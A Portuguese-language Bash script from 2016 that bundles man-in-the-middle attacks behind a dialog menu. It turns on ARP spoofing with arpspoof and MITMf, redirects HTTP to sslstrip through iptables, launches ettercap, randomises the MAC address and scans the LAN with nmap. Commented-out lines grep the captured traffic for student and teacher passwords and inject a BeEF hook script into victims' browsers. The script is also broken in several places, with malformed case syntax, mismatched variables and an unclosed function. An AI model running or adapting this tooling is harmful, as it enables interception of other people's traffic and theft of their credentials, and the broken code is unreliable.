#!/bin/bash
###############################################################################
# Script para otimizar alguns ataques MITM
# Autor: João Lucas  <joaolucas@linuxmail.org> 
#
# Historico:
#       v1.0 2016/02/23
#
# Pacotes requeridos:
#       sslstrip, macchanger, ettercap, arpspoof, mitmf, xfce4-terminal
#
# TODO - A função da opção DNS Poison ainda precisa ser criada
#         Usar dialog para deixar o script mais interativo
#       
# FIXME - sslstrip estava amarrando a shell atual, a solução foi executa-lo em outra tty
#         nao to conseguindo usar o PREFIX com o coamando grep (opçao 6 e 7)        
#       
# XXX - mitmf não esta capturando o trefego
################################################################################

#clear
DATA=$(date +'%Y-%m-%d-%H-%M')
PREFIX=/home/joao_lucas/Área\ de\ trabalho/Capturas
ARQ=$(touch $PREFIX/cap-$DATA.log)

function menu {
display=$( dialog --stdout --menu 'Man in The Middle'  0 0 0 \
1  'Listar placas de rede ativas' \
2  'Ver as regras do iptables' \
3  'Ver arquivos capturados' \
4  'Novo ataque <-- usando ettercap'  \
5  'Mudar mac address' \
6  'Buscar senhas de a' \
8  'Limpar as regras do Iptables' \
9 'Identificar hosts' \
10 'ARP Spoof <-- usando MiTMf' \
11 'ARP Spoof <-- usando arpspoof' \
12 'DNS POISON'

99 'Sair' )  

#if [ $? = 0 ]                
#then
read -p "Digite uma opção: " opt

case $display in
        1) ifconfig | less
                ;;
  
        2) #echo "Regras atuais: "
        regras=$(iptables -t nat -L)
        dialog --title 'Regras do Iptables' --textbox $regras 0 0       
        ;;
  
        3) echo "Arquivos de capturas: "
                ls -lh $PREFIX/* | less
                ;;
  
        4) echo "Novo ataque: "
                ## Criando regras do iptables
                echo "Criando as regras no Iptables..."
                iptables -t nat -F
                iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
                sleep 1
                ## Ativando o ip forward
                echo "Ativando o Ip forward..."
                echo 1 > /proc/sys/net/ipv4/ip_forward
                sleep 1

                ## Capturando o trafego com sslstrip e armazenando em um arquivo
                #echo "Iniciando o sslstrip... As informações estão sendo armazenadas no arquivo: cap-$data.log"e
                #sleep 1
                echo "Iniciando o Ettercap!"
                echo "Salvando em: $PREFIX/cap-$DATA.log"
                sleep 1
                ettercap -G & 

                killall -TERM sslstrip 2> /dev/null 
                xfce4-terminal -e  sslstrip > $PREFIX/cap-$DATA.log


                #sslstrip > $HOME/Área\ de\ trabalho/Capturas/cap-$data.log  
                #sslstrip -w  $HOME/Área\ de\ trabalho/Capturas/cap-$data.log 2>> $HOME/Área\ de\ trabalho/Scripts/erros.log   
              
               tail -f $PREFIX/$ARQ > output.txt $
               dialog --title 'Informações sendo capturadas' --tailbox output.txt 0 0
               
                ;;

        5) echo "Mudando Mac Address "
                read -p "Alterando mac da placa de rede wlp2s0" 
                macchanger -r wlp2s0
                ;;
  
        6) echo "Buscando passwds A..."
                #grep -rn -A 1 --binary-files=text aluno $PREFIX/$ARQ | tee -a $PREFIX/$ARQ | uniq -u | less
                ;;
  
        7) echo "Buscando passwords D..."
                #grep -rn -A 1 --binary-files=text docente  $PREFIX | tee -a $PREFIX/$ARQ | uniq -u | less
               ;;
   
       8) echo "Limpando as regras do Iptables..."
                iptables -t nat -F
                sleep 1
                ;;
   
        9) echo "Buscando por hosts... Salvando em hosts.txt        
                "
                nmap -Pn -T 3 192.168.1.0/24 > hosts.txt
                egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' hosts.txt | awk '{print $5}' | less
                #egrep  '([0-9]{1,3}\.){3}[0-9]{1,3}' hosts.txt
                #fgrep "Nmap scan" hosts.txt | less
                #grep -E "[0-9][0-9][0-9]"."[0-9][0-9][0-9]"."[0-254]"."[0-254]" hosts.txt
                ;;
   
        10) echo  "Realizando ARP Spoof com MiTMf" 
                

               TARGET=$( dialog --inputbox 'Target: ' 0 0 2>&1 )
                GW=$( dialog --inputbox 'Gateway:' 0 0 2>&1 )
                #read -p "TARGET: " target
                #read -p "GATEWAY: "  gw
                
                #exemplo de uso:
                # mitmf -i eth0 --target 192.168.1.100 --gateway 192.168.1.1 --arp --spoof --hsts
                # utulizando o script BeEF para coletar os dados da vitima
                #mintf -i wlip2s0 --target $target --gateway $gw --arp --spoof --hsts --inject --js-url http://192.168.1.100:3000/hook.js --spoof     
                
                echo "Iniciando o ARP Spoof..."
                sleep 1
                mitmf -i wlp2s0 --target $target --gateway $gw --arp --spoof
                ;; 
        
        11) echo "ARP Spoof..."
                #DESCRIÇÃO:
                # ARP Spoof permite interceptar informações confidenciais, posicionando-se no meio de uma conexão entre duas ou mais maquina
                
                #read -p "TARGET: " target
                #read -p "GATEWAY: " gateway
                
                echo 1 > /proc/sys/net/ipv4/ip_forward
                TARGET=$(dialog --stdout --inputbox 'Target: ' 0 0)
                GW=$(dialog --stdout --inputbox 'Gateway:' 0 0)

                xfce4-terminal -e "arpspoof -i wlp2s0 -t $TARGET $GW"
                xfce4-terminal -e "arpspoof -i wlp2s0 -t $GW $TARGET"    
                ;; 

        12) echo "Realizando DNS POISON"
                ;;
        99) #echo "Saindo..."
        dialog --title 'Saindo' --infobox 'Saindo em 3 segundos' 0 0           
                sleep 3
                exit 0
                ;
   
        *) echo "Opção Invalida!"

esac
#else
        # exit
#fi
#}

while true
do
        USER=$(whoami)
        
        if [ $USER = root ]
        then    
                dialog --title "Man in the Middle" \
 --msgbox "O autor do script não se responsabiliza por qualquer ato feito com má fé \
 utilizando esse Script!"  0 0
                menu  
        else
        echo "Executar o script como root!"
        fi
done
